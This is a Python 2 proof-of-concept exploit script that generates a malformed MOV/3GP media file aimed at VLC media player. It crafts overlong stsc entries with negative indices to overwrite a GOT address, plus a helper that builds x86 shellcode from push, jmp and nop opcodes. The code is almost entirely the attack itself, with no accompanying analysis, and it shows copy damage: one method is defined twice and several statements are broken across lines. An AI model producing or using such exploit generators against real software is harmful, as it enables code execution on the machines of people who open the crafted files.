#vlc_poc.py:

import struct
import sys


class mov_exploit:
    def
__init__(self,blocksize,gotbase,gotsize,shellcodebase=None,arch='win32'):

        self.arch=arch
        self.blocksize=blocksize
        self.gotbase=gotbase
        self.gotsize=gotsize
        if shellcodebase!=None:
            self.shellcodebase=shellcodebase
        else:

self.shellcodebase=self.revert_calc(self.make_calc(self.gotbase+self.gotsize+100))

        mdat = self.mkatom("mdat","MALDAAAAAD!")
        mvhd = self.mkatom("mvhd", "A"*100)

        WW = []
        jmpaddress = struct.pack(">L",0x42424242)

        maximo=-52000
        minimo=-51000

        WW.append((maximo,jmpaddress*2))
        WW.append((minimo,jmpaddress*2))

        stscjmp = self.mkatom("stsc",self._mkstsc(WW))
        trakjmp = self._mktrak(stscjmp)

        moov = self.mkatom("moov",trakjmp+mvhd)
        ftyp =
self.mkatom("ftyp","3gp4"+"\x00\x00\x02\x00"+"3gp4"+"3gp33gp23gp1")
        self.file = ftyp+mdat+moov

    def __str__(self):
        return self.file

    def mkatom(self,type,data):
        if len(type) != 4:
                raise "type must by of length 4!!!"
        mov = ""
        mov += struct.pack(">L",len(data)+8)
        mov += type
        mov += data
        return mov

    def make_calc(self,x):
        r3t =(((x-4) / self.blocksize) + 1)
        return r3t

    def revert_calc(self,x):
        r = (self.blocksize * (x-1)) + 4
        return r

    def _reverse(self,s):
        l = list(s)
        l.reverse()
        return "".join(l)

    def _mkstsc(self,l):

        r3t = ""
        r3t += struct.pack(">L",1)
        r3t += struct.pack(">L",len(l)+1)
        oldwhere = 0
        for where, what in l:
            oldwhere = where
            if len(what) != 8:
                raise "Wrong what leng"
            r3t += struct.pack(">L",where) + what #self._reverse(what)

        r3t += struct.pack(">L",where + 1) + "FELISCCC"
        return r3t


    def _mkstsc(self,l):

        r3t = ""
        r3t += struct.pack(">L",1)                #version, format 
needed
        r3t += struct.pack(">L",len(l)+1)         #number of stsc chunks

        oldwhere = 0
        for where, what in l:
            oldwhere = where
            if len(what) != 8:
                raise "Wrong what leng %d"%len(what)
            r3t += struct.pack(">L",where) + what #self._reverse(what)

        r3t += struct.pack(">L",where + 1) + "FELISaLS"
        return r3t

    def _pack(self,s):
        if len(s) != 8:
            raise "Wrong size!"
        return s[3]+s[2]+s[1]+s[0]+s[7]+s[6]+s[5]+s[4]

    def _pack4(self,s):
        if len(s) != 4:
            raise "Wrong size!"
        return s[3]+s[2]+s[1]+s[0]

    def _mkshellcode(self,payload):

        if len(payload) % 4:
            payload += "X" * (4 - len(payload) % 4)
        payload = self._reverse(payload)


        movesp = '\xbc'
        push = '\x68'
        jmps = '\xeb'
        nop  = '\x90'

        shellcode = []

        scode = ""
        scode += movesp +
struct.pack("<L",4+self.shellcodebase+(len(payload)/4)*self.blocksize+len(payload)+1)
        scode += nop*(8-(len(scode)+2))
        scode += jmps + struct.pack("B",self.blocksize-8)
        shellcode.append(scode)

        for i in range(0,len(payload),4):
            scode = ""
            scode += push + self._pack4(payload[i:i+4])
            scode += nop*(8-(len(scode)+2))
            scode += jmps + struct.pack("B",self.blocksize-8)
            shellcode.append(scode)

        return shellcode

    def _mktrak(self,stsc):
        tkhd = self.mkatom("tkhd", "A"*100)
        hdlr = self.mkatom("hdlr", "\x00"*4+"mhlrtext"+"appl"+"\x00"*9)
        mdhd = self.mkatom("mdhd", "A"*100)
        co64 = self.mkatom("co64", struct.pack(">L",10) +
struct.pack(">L",2) + "A"*100)
        stbl = self.mkatom("stbl",self.mkatom("stsd","UFFFF") + co64+ 
stsc)
        minf = self.mkatom("minf",stbl)
        mdia = self.mkatom("mdia",minf+mdhd+hdlr)
        trakjmp = self.mkatom("trak",mdia+tkhd+mdia)
        return trakjmp

try:
    binary_file = mov_exploit(20,0x872e0f8,3996,arch="linux").__str__()
    file = open(sys.argv[1], "wb")
    file.write(binary_file)
    file.close()
    print "[+] File %s already generated" % sys.argv[1]
except:
    print "[+] Usage: python vlc_poc.py anyname.mov"

-----------/ 
